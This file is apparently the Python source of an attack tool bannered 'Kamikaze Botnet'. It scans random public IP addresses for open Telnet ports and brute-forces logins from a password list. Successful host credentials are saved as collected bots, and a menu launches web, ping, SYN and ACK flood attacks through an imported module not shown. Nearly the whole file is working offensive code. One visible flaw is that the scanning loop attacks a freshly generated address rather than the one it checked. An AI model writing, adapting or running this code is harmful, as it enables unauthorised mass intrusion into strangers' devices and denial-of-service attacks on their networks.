import random
import socket
import struct
import telnetlib
import time
from ataque import Ataque
from ataque import loadAtaque

user_list=[]
password_list=[]
total_list=0

def load():

    with open("password.txt","r") as f:
        for line in f:
            user_list.append(line.split(":")[0])
            password_list.append(line.strip("\n").split(":")[1])
            global total_list
            total_list+=1

def attack(ip):

    lista_ips=open("equipos.txt","a")

    for x in range(total_list):

        tn = telnetlib.Telnet(ip)

        tn.read_until(b"login: ")
        tn.write(user_list[x].encode('ascii') + b"\n")
        
        tn.read_until(b"Password: ")
        tn.write(password_list[x].encode('ascii') + b"\n")
        
        lv=tn.read_until(b'Welcome',timeout=5)
        lv

        if lv == b'\r\n\r\nLogin incorrect\r\nadministrador login: ':
                print(f'user:{user_list[x]} password:{password_list[x]} --- Incorrect')
                tn.close()
        elif lv==b'\r\nWelcome':
                print(f'user:{user_list[x]} password:{password_list[x]} --- Correct')
                lista_ips.write(f'{ip}:{user_list[x]}:{password_list[x]}:NS\n')
                lista_ips.close()
                tn.close()
                break

def IP():

    random_ip=socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
    sv=int(random_ip.split(".")[0])
    sb=int(random_ip.split(".")[1])
    while(sv==127 or sv==0 or sv==3 or sv==15 or sv==56 or sv==10 or (sv==192 and sb==168) or (sv == 172 and sb >= 16 and sb < 32) or (sv == 100 and sb >= 64 and sb < 127) or (sv==169 and sb>254) or (sv==198 and sb>= 18 and sb<20) or sv>=224 or sv==6 or sv==7 or sv==11 or sv==21 or sv==22 or sv==26 or sv==28 or sv==29 or sv==30 or sv==33 or sv==55 or sv==214 or sv==215):
        print(f'[*] IP {random_ip} not valid\n')
        return False
    print(f'[*] IP {random_ip} valid')
    return random_ip

def numero():
    print("-"*20)
    for i in range(total_list):
        print(f'usuario:{user_list[i]} contraseña:{password_list[i]}')
    print("-"*20)

def alive(ip):
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    location=(ip,23)
    a_socket.settimeout(0.1)

    result_of_check = a_socket.connect_ex(location)

    if result_of_check == 0:
        print(f"    +---> {ip} with Port 23 is open\n")
        a_socket.close()
        return True
    else:
        print(f"    +---> {ip} with Port 23 is not open\n")
        a_socket.close()
        return False

if __name__ == '__main__':

    print('''
  _  __          __  __ _____ _____            
 | |/ /    /\   |  \/  |_   _|  __ \     /\    
 | ' /    /  \  | \  / | | | | |__) |   /  \   
 |  <    / /\ \ | |\/| | | | |  _  /   / /\ \  
 | . \  / ____ \| |  | |_| |_| | \ \  / ____ \ 
 |_|\_\/_/___ \_\_|__|_|_____|_|__\_\/_/__  \_\\
 |  _ \ / __ \__   __| \ | |  ____|__   __|    
 | |_) | |  | | | |  |  \| | |__     | |       
 |  _ <| |  | | | |  | . ` |  __|    | |       
 | |_) | |__| | | |  | |\  | |____   | |       
 |____/ \____/  |_|  |_| \_|______|  |_|
 
 +----------------------------------------------+
 |                                              |
 |    Telnet Brute Force Attack : 1             |
 |    |                                         |
 |    +---> ( Bot Collect )                     |
 |                                              |
 |    Web Page Attack : 2                       |
 |                                              |
 |    Ping Attack : 3                           |
 |                                              |
 |    SYN Attack : 4                            |
 |                                              |
 |    ACK Attack : 5                            |
 |                                              | 
 +----------------------------------------------+
    ''')
    
    numero=int(input("Select the option: "))

    if numero==1:

        load()

        while 1:

            a=IP()

            if a==False:

                continue

            if alive(a) == True:

                try:

                    attack(IP())

                except:

                    continue

    elif numero==2:

        ip=str(input("Insert the IP: "))
        loadAtaque()
        Ataque(1,ip,0,"None")

    elif numero==3:

        ip=str(input("Insert the IP: "))
        loadAtaque()
        Ataque(2,ip,0,"None")

    elif numero==4:

        ip=str(input("Insert the IP: "))
        puerto=str(input("Select the port: "))

        loadAtaque()
        Ataque(3,ip,puerto,"-S")

    elif numero==5:

        ip=str(input("Insert the IP: "))
        puerto=str(input("Select the port: "))

        loadAtaque()
        Ataque(3,ip,puerto,"-A")
